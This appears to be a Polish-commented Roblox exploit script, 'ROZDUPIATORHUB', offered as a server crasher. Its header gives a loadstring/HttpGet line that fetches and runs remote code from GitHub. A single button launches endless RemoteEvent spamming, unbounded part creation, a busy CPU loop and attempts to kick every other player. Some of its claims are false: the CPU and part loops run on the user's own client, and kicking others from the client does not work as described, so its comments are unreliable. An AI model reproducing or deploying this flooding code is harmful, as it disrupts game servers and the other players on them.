--[[
    Link do uruchomienia:
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Plakalhub/rozdupiator/refs/heads/main/PlakalHub.lua'))()

    ROZDUPIATORHUB – laguje innych, nie Ciebie
]]

-- tworzenie GUI
local gui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local button = Instance.new("TextButton")

gui.Name = "RozdupiatorGUI"
gui.Parent = game.CoreGui

frame.Name = "Frame"
frame.Parent = gui
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 3
frame.Position = UDim2.new(0.4, 0, 0.4, 0)
frame.Size = UDim2.new(0, 200, 0, 60)
frame.Active = true
frame.Draggable = true

button.Name = "ZniszczSerwer"
button.Parent = frame
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button.BorderColor3 = Color3.fromRGB(0, 0, 0)
button.BorderSizePixel = 2
button.Size = UDim2.new(0, 180, 0, 40)
button.Position = UDim2.new(0, 10, 0, 10)
button.Text = "Zniszcz Serwer"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 18
button.Font = Enum.Font.SourceSansBold

-- Twój gracz (nie będziesz lagowany/wyrzucany)
local localPlayer = game.Players.LocalPlayer

-- spam zdarzeniami zdalnymi (lag dla innych)
local function spamZdalne()
    local repStorage = game:GetService("ReplicatedStorage")
    for _, obiekt in ipairs(repStorage:GetChildren()) do
        if obiekt:IsA("RemoteEvent") or obiekt:IsA("RemoteFunction") then
            spawn(function()
                while true do
                    pcall(function()
                        obiekt:FireServer("CRASH_DATA")
                    end)
                end
            end)
        end
    end
end

-- wyciek pamięci (lag dla innych – tworzy części w workspace)
local function wyciekPamieci()
    local czesci = {}
    while true do
        local czesc = Instance.new("Part")
        czesc.Name = "WYCIEK_" .. tostring(#czesci)
        czesc.Parent = workspace
        table.insert(czesci, czesc)
    end
end

-- zapętlenie (obciążenie CPU – dla innych)
local function zapetlenie()
    local x = 0
    while true do
        x = x + 1
        if x > 1e9 then x = 0 end
    end
end

-- wyrzucanie innych graczy (pomija Ciebie)
local function wyrzucInnych()
    while true do
        for _, gracz in ipairs(game.Players:GetPlayers()) do
            if gracz ~= localPlayer then
                pcall(function()
                    gracz:Kick("Serwer zniszczony przez ROZDUPIATORHUB")
                end)
            end
        end
        task.wait(0.1)
    end
end

local function zniszczSerwer()
    spawn(spamZdalne)
    spawn(wyciekPamieci)
    spawn(zapetlenie)
    task.wait(0.5)
    spawn(wyrzucInnych)
end

button.MouseButton1Click:Connect(zniszczSerwer)
